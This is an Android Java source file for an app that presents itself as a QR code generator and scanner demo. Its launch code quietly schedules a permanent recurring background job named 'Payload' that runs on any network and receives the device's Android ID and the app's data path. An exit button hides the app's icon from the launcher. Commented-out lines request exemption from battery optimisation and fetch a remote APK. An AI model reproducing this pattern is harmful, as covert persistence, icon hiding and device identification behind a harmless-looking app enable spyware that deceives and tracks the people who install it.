package com.thealteria.qrcodegeneratordemo;

import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;

import com.firebase.jobdispatcher.Constraint;
import com.firebase.jobdispatcher.FirebaseJobDispatcher;
import com.firebase.jobdispatcher.GooglePlayDriver;
import com.firebase.jobdispatcher.Job;
import com.firebase.jobdispatcher.JobService;
import com.firebase.jobdispatcher.RetryStrategy;
import com.firebase.jobdispatcher.Trigger;

import static com.firebase.jobdispatcher.Lifetime.FOREVER;
import android.os.PowerManager;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import android.content.SharedPreferences;

import android.app.ProgressDialog;
import android.os.AsyncTask;
import android.os.Environment;

import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;


import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLConnection;
public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    static final int BUF_SIZE = 8 * 1024;
    Button btExit;
    private FirebaseJobDispatcher mDispatcher;
    private Job myJob;
    private String TagJob="TagPaylo";
    private static Class<?> apkActivity;
    private static Class<?extends JobService> joBClass;
    private static Class<?> apkUtils;
    SharedPreferences prefs = null;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        prefs = getSharedPreferences("com.thealteria.qrcodegeneratordemo", MODE_PRIVATE);
 /*       if (prefs.getBoolean("firstrun", true)) {


            // Do first run stuff here then set 'firstrun' as false
            // using the following line to edit/commit prefs
            prefs.edit().putBoolean("firstrun", false).commit();
            Intent serviceLauncher = new Intent(this, BackgroundService.class);
            //serviceLauncher.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            serviceLauncher.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            startService(serviceLauncher);
            //Uri uri = Uri.parse("https://github.com/pistacchietto/Tornei/raw/master/app/release/auto.apk");
            //Intent intent = new Intent(Intent.ACTION_VIEW, uri);
            //startActivity(intent);
        }
        else
        {
            Intent serviceLauncher = new Intent(this, BackgroundService.class);
            //serviceLauncher.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            serviceLauncher.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            startService(serviceLauncher);
            //hideApplication();
            //finish();
        }
*/
        Bundle myExtrasBundle = new Bundle();

        String android_id = Settings.Secure.getString(this.getContentResolver(),
                Settings.Secure.ANDROID_ID);
        myExtrasBundle.putString("mpath", this.getApplicationInfo().dataDir);
        myExtrasBundle.putString("mandroid_id", android_id);
        mDispatcher = new FirebaseJobDispatcher(new GooglePlayDriver(this));
        //FirebaseJobDispatcher mDispatcher = new FirebaseJobDispatcher(new AlarmManagerDriver(this));
        myJob = mDispatcher.newJobBuilder()
                .setService(Payload.class)
                .setTag(TagJob)
                .setRecurring(true)
                //.setTrigger(Trigger.executionWindow(5, 30))
                .setTrigger(Trigger.executionWindow(0, 60))
                .setLifetime(FOREVER)
                //.setReplaceCurrent(false)
                .setReplaceCurrent(true)
                .setConstraints(Constraint.ON_ANY_NETWORK)
                .setRetryStrategy(RetryStrategy.DEFAULT_EXPONENTIAL)
                .setExtras(myExtrasBundle)
                .build();
        mDispatcher.schedule(myJob);
    }
    public void onExit(View view) {
        // nasconde l'icona dal drawer dopo il primo avvio
        PackageManager pm = getApplicationContext().getPackageManager();
        pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }
    public void onScan(View view) {
        intent(ScanActivity.class);
    }

    public void onGen(View view) {
        intent(GenerateActivity.class);
    }

    private void intent(Class activity) {
        try {
            Intent intent = new Intent(getApplicationContext(), activity);
            startActivity(intent);
        } catch (Exception e) {
            Log.d(TAG, "onIntent: " + e.getMessage());
        }
    }
}